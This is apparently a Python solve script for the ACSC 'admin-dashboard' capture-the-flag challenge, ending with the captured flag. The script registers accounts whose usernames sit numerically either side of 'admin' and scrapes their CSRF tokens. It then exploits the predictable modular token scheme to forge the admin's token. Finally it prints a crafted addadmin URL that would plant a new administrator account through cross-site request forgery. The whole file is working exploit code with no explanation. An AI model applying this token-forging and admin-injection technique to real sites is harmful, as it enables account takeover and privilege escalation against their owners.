import requests
from Crypto.Util.number import bytes_to_long, long_to_bytes
import re

BASE_URL = "http://admin-dashboard.chal.ctf.acsc.asia"
# BASE_URL = "http://admin-dashboard-2.chal.ctf.acsc.asia:8000"
# BASE_URL = "http://localhost:8000"

admin_num = bytes_to_long(b"admin")
diff = 13
s = requests.session()

prev_admin = long_to_bytes(admin_num - diff).decode()
s.get(f"{BASE_URL}/register?username={prev_admin}&password=pass")
s.get(f"{BASE_URL}/login?username={prev_admin}&password=pass")
text = s.get(f"{BASE_URL}/addadmin").text
m = re.search(
    r"name=\"csrf-token\" value=\"(\w+)\"", text)
prev_token = int(m.group(1), 16)
print(prev_admin, prev_token)

next_admin = long_to_bytes(admin_num + diff).decode()
s = requests.session()
s.get(f"{BASE_URL}/register?username={next_admin}&password=pass")
s.get(f"{BASE_URL}/login?username={next_admin}&password=pass")
text = s.get(f"{BASE_URL}/addadmin").text
m = re.search(
    r"name=\"csrf-token\" value=\"(\w+)\"", text)
next_token = int(m.group(1), 16)
print(next_admin, next_token)

M = 0xc4f3b4b3deadbeef1337c0dedeadc0dd
inv_2 = pow(2, -1, M)
assert 2 * inv_2 % M == 1

csrf_token = ((prev_token + next_token) * inv_2) % M
csrf_token = hex(csrf_token)
print(csrf_token)

print(f"http://localhost/addadmin?username=lorseadmin&password=lorsekudos&csrf-token="+csrf_token[2:])

# ACSC{C$rF_15_3VerYwh3Re!}
